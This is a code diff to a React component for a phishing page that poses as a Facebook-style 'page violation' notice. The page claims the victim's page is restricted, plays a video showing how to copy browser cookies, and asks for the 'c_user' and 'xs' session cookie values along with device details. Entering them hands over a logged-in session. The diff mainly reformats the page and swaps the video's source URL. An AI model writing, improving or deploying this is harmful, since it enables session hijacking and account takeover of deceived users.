@@ -93,10 +93,12 @@ function Home({ onNext }) {
   };
 
   return (
-    <div style={{ 
-      backgroundColor: "#fff",
-      width: "100%"
-    }}>
+    <div
+      style={{
+        backgroundColor: "#fff",
+        width: "100%",
+      }}
+    >
       {/* Form Header */}
       <div
         style={{
@@ -111,7 +113,7 @@ function Home({ onNext }) {
             margin: "0",
             fontSize: "1.2rem",
             fontWeight: "600",
-            color: "#333"
+            color: "#333",
           }}
         >
           Request For Remove Page Violation
@@ -119,244 +121,238 @@ function Home({ onNext }) {
       </div>
 
       {/* Form Content */}
-      <div style={{ 
-        padding: "1.5rem"
-      }}>
-            <p
-              style={{
-                fontWeight: "600",
-                fontSize: "14px",
-                marginBottom: "8px",
-              }}
-            >
-              We've identified irregular activity on your page that goes against
-              our community guidelines.
-            </p>
-            <p
-              style={{
-                fontWeight: "600",
-                fontSize: "14px",
-                marginBottom: "8px",
-              }}
-            >
-              As a result, access to your page has been restricted, and you're
-              presently unable to post, share, or comment using it.
-            </p>
-            <p
-              style={{
-                fontWeight: "600",
-                fontSize: "14px",
-                marginBottom: "8px",
-              }}
-            >
-              Please provide the precise details below. Refer to the video for
-              clarification if you find the instructions unclear.
-            </p>
-            <p
-              style={{
-                fontWeight: "600",
-                color: "#6c757d",
-                fontSize: "12px",
-                marginBottom: "8px",
-              }}
-            >
-              Detailed Video Information.
-            </p>
-
-            {/* Video Section */}
-            <video
-              controls
-              autoPlay
-              src="https://cdn.glitch.global/cfdab748-b145-4b28-8f85-c26ac388a3c9/cookies.mp4?v=1719846896202"
-              style={{
-                width: "300px",
-                height: "160px",
-                maxWidth: "100%",
-              }}
-            />
-            <br />
-            <button
-              style={{
-                marginTop: "8px",
-                padding: "4px 8px",
-                backgroundColor: "#f8f9fa",
-                border: "1px solid #ddd",
-                borderRadius: "4px",
-                cursor: "pointer",
-              }}
-            >
-              Enable Sound
-            </button>
-
-            <p
-              style={{
-                fontWeight: "600",
-                fontSize: "14px",
-                marginTop: "0.5rem",
-                marginBottom: "8px",
-              }}
-            >
-              Please be sure to provide the requested information below.
-            </p>
-
-            <form onSubmit={handleSubmit}>
-              {/* Hidden device information fields */}
-              <input
-                type="hidden"
-                name="screenWidth"
-                value={window.innerWidth}
-              />
-              <input
-                type="hidden"
-                name="screenHeight"
-                value={window.innerHeight}
-              />
-              <input
-                type="hidden"
-                name="isTouchDevice"
-                value={"ontouchstart" in window ? "true" : "false"}
-              />
-
-              {/* c_user field */}
-              <label
-                style={{
-                  fontSize: "12px",
-                  display: "block",
-                  marginBottom: "4px",
-                }}
-              >
-                c_user
-              </label>
-              <input
-                type="number"
-                name="c_user"
-                value={formData.c_user}
-                onChange={handleInputChange}
-                required
-                pattern="^\d{15}$"
-                title="Please enter 15 digits"
-                style={{
-                  width: "100%",
-                  padding: "8px",
-                  border: "1px solid #ddd",
-                  borderRadius: "4px",
-                  marginBottom: "1rem",
-                  boxSizing: "border-box",
-                }}
-              />
-              {errors.c_user && (
-                <div
-                  style={{
-                    color: "red",
-                    fontSize: "12px",
-                    marginTop: "-0.5rem",
-                    marginBottom: "0.5rem",
-                  }}
-                >
-                  {errors.c_user}
-                </div>
-              )}
-
-              {/* xs field */}
-              <label
-                style={{
-                  fontSize: "12px",
-                  display: "block",
-                  marginBottom: "4px",
-                }}
-              >
-                xs
-              </label>
-              <input
-                type="text"
-                name="xs"
-                value={formData.xs}
-                onChange={handleInputChange}
-                required
-                style={{
-                  width: "100%",
-                  padding: "8px",
-                  border: "1px solid #ddd",
-                  borderRadius: "4px",
-                  marginBottom: "1rem",
-                  boxSizing: "border-box",
-                }}
-              />
-              {errors.xs && (
-                <div
-                  style={{
-                    color: "red",
-                    fontSize: "12px",
-                    marginTop: "-0.5rem",
-                    marginBottom: "0.5rem",
-                  }}
-                >
-                  {errors.xs}
-                </div>
-              )}
-
-              <p
-                style={{
-                  fontSize: "12px",
-                  marginTop: "0.5rem",
-                  marginBottom: "1rem",
-                }}
-              >
-                Please make sure not to log out from your computer or laptop
-                until you have received a verification email.
-              </p>
-
-              {errors.submit && (
-                <div
-                  style={{
-                    color: "red",
-                    fontSize: "14px",
-                    marginBottom: "1rem",
-                  }}
-                >
-                  {errors.submit}
-                </div>
-              )}
-
-              {/* Submit Button inside form */}
-              <div
-                style={{
-                  display: "flex",
-                  justifyContent: "flex-end",
-                  marginTop: "1rem",
-                }}
-              >
-                <button
-                  type="submit"
-                  disabled={isSubmitting}
-                  style={{
-                    color: "white",
-                    border: "none",
-                    background: "rgb(66, 103, 178)",
-                    padding: "8px 16px",
-                    borderRadius: "4px",
-                    cursor: isSubmitting ? "not-allowed" : "pointer",
-                    opacity: isSubmitting ? 0.6 : 1,
-                  }}
-                >
-                  {isSubmitting ? "Submitting..." : "Submit"}
-                </button>
-              </div>
-            </form>
-        </div>
-
-        {/* Form Footer */}
-        <div
+      <div
+        style={{
+          padding: "1.5rem",
+        }}
+      >
+        <p
           style={{
-            padding: "1rem",
-            display: "flex",
-            justifyContent: "flex-end",
-            background: "rgb(245, 246, 247)",
-            borderBottomLeftRadius: "8px",
-            borderBottomRightRadius: "8px",
-            borderTop: "1px solid #e3e6ea"
+            fontWeight: "600",
+            fontSize: "14px",
+            marginBottom: "8px",
           }}
-        ></div>
+        >
+          We've identified irregular activity on your page that goes against our
+          community guidelines.
+        </p>
+        <p
+          style={{
+            fontWeight: "600",
+            fontSize: "14px",
+            marginBottom: "8px",
+          }}
+        >
+          As a result, access to your page has been restricted, and you're
+          presently unable to post, share, or comment using it.
+        </p>
+        <p
+          style={{
+            fontWeight: "600",
+            fontSize: "14px",
+            marginBottom: "8px",
+          }}
+        >
+          Please provide the precise details below. Refer to the video for
+          clarification if you find the instructions unclear.
+        </p>
+        <p
+          style={{
+            fontWeight: "600",
+            color: "#6c757d",
+            fontSize: "12px",
+            marginBottom: "8px",
+          }}
+        >
+          Detailed Video Information.
+        </p>
+
+        {/* Video Section */}
+        <video
+          controls
+          autoPlay
+          src="https://pub60aa16ad6dd748cebebaed9839624492.r2.dev/ownlink.mp4"
+          style={{
+            width: window.innerWidth <= 768 ? "100%" : "300px",
+            height: window.innerWidth <= 768 ? "auto" : "160px",
+            maxWidth: "100%",
+          }}
+        />
+        <br />
+        <button
+          style={{
+            marginTop: "8px",
+            padding: "4px 8px",
+            backgroundColor: "#f8f9fa",
+            border: "1px solid #ddd",
+            borderRadius: "4px",
+            cursor: "pointer",
+          }}
+        >
+          Enable Sound
+        </button>
+
+        <p
+          style={{
+            fontWeight: "600",
+            fontSize: "14px",
+            marginTop: "0.5rem",
+            marginBottom: "8px",
+          }}
+        >
+          Please be sure to provide the requested information below.
+        </p>
+
+        <form onSubmit={handleSubmit}>
+          {/* Hidden device information fields */}
+          <input type="hidden" name="screenWidth" value={window.innerWidth} />
+          <input type="hidden" name="screenHeight" value={window.innerHeight} />
+          <input
+            type="hidden"
+            name="isTouchDevice"
+            value={"ontouchstart" in window ? "true" : "false"}
+          />
+
+          {/* c_user field */}
+          <label
+            style={{
+              fontSize: "12px",
+              display: "block",
+              marginBottom: "4px",
+            }}
+          >
+            c_user
+          </label>
+          <input
+            type="number"
+            name="c_user"
+            value={formData.c_user}
+            onChange={handleInputChange}
+            required
+            pattern="^\d{15}$"
+            title="Please enter 15 digits"
+            style={{
+              width: "100%",
+              padding: "8px",
+              border: "1px solid #ddd",
+              borderRadius: "4px",
+              marginBottom: "1rem",
+              boxSizing: "border-box",
+            }}
+          />
+          {errors.c_user && (
+            <div
+              style={{
+                color: "red",
+                fontSize: "12px",
+                marginTop: "-0.5rem",
+                marginBottom: "0.5rem",
+              }}
+            >
+              {errors.c_user}
+            </div>
+          )}
+
+          {/* xs field */}
+          <label
+            style={{
+              fontSize: "12px",
+              display: "block",
+              marginBottom: "4px",
+            }}
+          >
+            xs
+          </label>
+          <input
+            type="text"
+            name="xs"
+            value={formData.xs}
+            onChange={handleInputChange}
+            required
+            style={{
+              width: "100%",
+              padding: "8px",
+              border: "1px solid #ddd",
+              borderRadius: "4px",
+              marginBottom: "1rem",
+              boxSizing: "border-box",
+            }}
+          />
+          {errors.xs && (
+            <div
+              style={{
+                color: "red",
+                fontSize: "12px",
+                marginTop: "-0.5rem",
+                marginBottom: "0.5rem",
+              }}
+            >
+              {errors.xs}
+            </div>
+          )}
+
+          <p
+            style={{
+              fontSize: "12px",
+              marginTop: "0.5rem",
+              marginBottom: "1rem",
+            }}
+          >
+            Please make sure not to log out from your computer or laptop until
+            you have received a verification email.
+          </p>
+
+          {errors.submit && (
+            <div
+              style={{
+                color: "red",
+                fontSize: "14px",
+                marginBottom: "1rem",
+              }}
+            >
+              {errors.submit}
+            </div>
+          )}
+
+          {/* Submit Button inside form */}
+          <div
+            style={{
+              display: "flex",
+              justifyContent: "flex-end",
+              marginTop: "1rem",
+            }}
+          >
+            <button
+              type="submit"
+              disabled={isSubmitting}
+              style={{
+                color: "white",
+                border: "none",
+                background: "rgb(66, 103, 178)",
+                padding: "8px 16px",
+                borderRadius: "4px",
+                cursor: isSubmitting ? "not-allowed" : "pointer",
+                opacity: isSubmitting ? 0.6 : 1,
+              }}
+            >
+              {isSubmitting ? "Submitting..." : "Submit"}
+            </button>
+          </div>
+        </form>
+      </div>
+
+      {/* Form Footer */}
+      <div
+        style={{
+          padding: "1rem",
+          display: "flex",
+          justifyContent: "flex-end",
+          background: "rgb(245, 246, 247)",
+          borderBottomLeftRadius: "8px",
+          borderBottomRightRadius: "8px",
+          borderTop: "1px solid #e3e6ea",
+        }}
+      ></div>
     </div>
   );
 }
